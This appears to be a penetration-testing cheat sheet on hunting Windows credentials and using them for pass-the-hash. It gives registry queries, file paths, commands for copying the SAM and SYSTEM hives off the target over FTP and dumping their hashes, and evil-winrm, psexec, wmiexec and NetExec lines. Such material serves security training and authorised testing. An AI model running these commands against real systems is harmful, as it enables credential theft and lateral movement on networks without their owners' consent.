## **Credential Hunting Methods** 

This section covers eight primary techniques for identifying and extracting credentials within a Windows environment, often used during post-exploitation for privilege escalation and lateral movement. 

## **Summary Table: Credential Hunting Methods** 

|**S.**<br>**No**|**Technique**|**Description**|**Important Commands / Paths**|
|---|---|---|---|
|1|Global<br>Registry<br>Search|Manual search for<br>"password" strings<br>throughout the registry.|`reg query HKLM /f "password"`<br>`/t REG_SZ /s`|
|2|Winlogon<br>(AutoLogon)|Registry check for auto-<br>login configurations<br>containing plaintext<br>credentials.|`HKLM\SOFTWARE\Microsoft\Wind`<br>`ows`<br>`NT\CurrentVersion\Winlogon`|
|3|PuTTY Stored<br>Sessions|Extracting stored proxy<br>usernames and<br>passwords from saved<br>sessions.|`HKCU\Software\SimonTatham\Pu`<br>`TTY\Sessions`|
|4|Credential<br>Manager|Querying saved<br>Windows credentials for<br>RDP/SMB.|`cmdkey /list`,`runas /savecred`|
|5|SAM &<br>SYSTEM<br>Databases|Extracting hash<br>databases for offline<br>decryption.|`C:\Windows\System32\config\`<br>(or`\repair`)|
|6|PowerShell<br>History|Reviewing the<br>`PSReadLine`history file<br>for typed credentials.|`%userprofile%`<br>`\AppData\Roaming\Microsoft\W`<br>`indows\PowerShell\PSReadLine`<br>`\ConsoleHost_history.txt`|



|**S.**<br>**No**|**Technique**|**Description**|**Important Commands / Paths**|
|---|---|---|---|
|7|Unattended<br>Installs|Extracting admin<br>passwords from<br>automated deployment<br>XML files.|`C:`<br>`\Windows\Panther\Unattend.xm`<br>`l`|
|8|Web / Config<br>Files|Searching for DB/service<br>credentials in server<br>config files.|`web.config`,`.json`files|



## **Detailed Methods** 

## **1. Global Registry Search** 

Third-party software often stores credentials in the registry in plaintext. You can query the entire `HKEY_LOCAL_MACHINE` (HKLM) hive. 

- **Command:** `reg query HKLM /f "password" /t REG_SZ /s` 

- **Note:** This command generates extensive output; manual analysis is required unless using automated tools like WinPEAS. 

## **2. Winlogon (AutoLogon) Registry Check** 

If "Auto Login" is enabled, credentials may be stored in the registry. 

- **Path:** `reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` 

- **Targets:** Look for `DefaultUserName` and `DefaultPassword` . If `AutoAdminLogon` is set to `1` , the credentials are likely present. 

## **3. PuTTY Stored Sessions** 

PuTTY does not save SSH passwords, but it may store proxy credentials in plaintext within registry keys. 

- **Path:** `reg query HKCU\Software\SimonTatham\PuTTY\Sessions` 

- **Targets:** Inspect individual sessions for `ProxyUsername` and `ProxyPassword` keys. 

## **4. Windows Credential Manager** 

Stores credentials for RDP, SMB, and other services. 

- **List Credentials:** `cmdkey /list` 

- **Exploitation:** You cannot decrypt these directly, but you can use `runas /savecred` to execute commands as the user associated with the stored credentials (e.g., `runas /savecred /user:admin cmd.exe` ). 

## **5. SAM & SYSTEM Databases** 

Windows stores password hashes in the Security Account Manager (SAM) database, which is encrypted using a key stored in the SYSTEM file. 

- **Backup Hunting:** If the live `C:\Windows\System32\config\SAM` is locked (Access Denied), check `C:\Windows\System32\repair` for backups. 

- **Transfer:** Copy both `SAM` and `SYSTEM` files to a writable directory, then use an FTP server (e.g., `python3 -m pyftpdlib -w -p 21` ) to download them to your machine. 

- **Decryption:** Use Impacket to dump the hashes: 

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

## **Pass-The-Hash (PtH) Techniques** 

Once you have NTLM hashes, you can use them for authentication without needing the plaintext password. 

## **1. Evil-WinRM** 

Ideal for stable, interactive PowerShell sessions if port 5985/5986 is open. 

- **Command:** `evil-winrm -i <Target_IP> -u Administrator -H <NTLM_Hash>` 

## **2. Impacket Suite** 

- **`psexec.py` :** Creates a temporary service; provides a `SYSTEM` shell. It is noisy and easily detected by EDR. 

   - **Command:** `psexec.py Administrator@<Target_IP> -hashes 00000000000000000000000000000000:<NTLM_Hash>` 

- **`wmiexec.py` :** Uses WMI for command execution; does not create a new service. It is significantly stealthier. 

   - **Command:** `wmiexec.py Administrator@<Target_IP> -hashes 00000000000000000000000000000000:<NTLM_Hash>` 

## **3. NetExec (nxc)** 

Used for lateral movement and validating hashes across a subnet. 

- **Command:** `nxc smb <Target_IP> -u Administrator -H <NTLM_Hash> -x "whoami"` 

## **Additional Credential Sources** 

## **6. PowerShell History File** 

PowerShell preserves command history, which may accidentally include plaintext passwords. 

- **Command:** `type C:` 

   - `\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSRead Line\ConsoleHost_history.txt` 

## **7. Unattended Installation Files (** **`Unattend.xml` )** 

Used for OS deployment; these files occasionally contain plaintext or Base64-encoded administrator credentials. 

- **Command:** `type C:\Windows\Panther\Unattend.xml` 

## **8. Web / Software Configuration Files** 

Servers running IIS, XAMPP, or Tomcat often store database connection strings or service accounts in configuration files. 

- **Example:** `type C:` 

   - `\Windows\Microsoft.NET\Framework64\v4...\Config\web.config` 

- **Goal:** Extract database credentials to use for further password spraying or internal pivoting. 

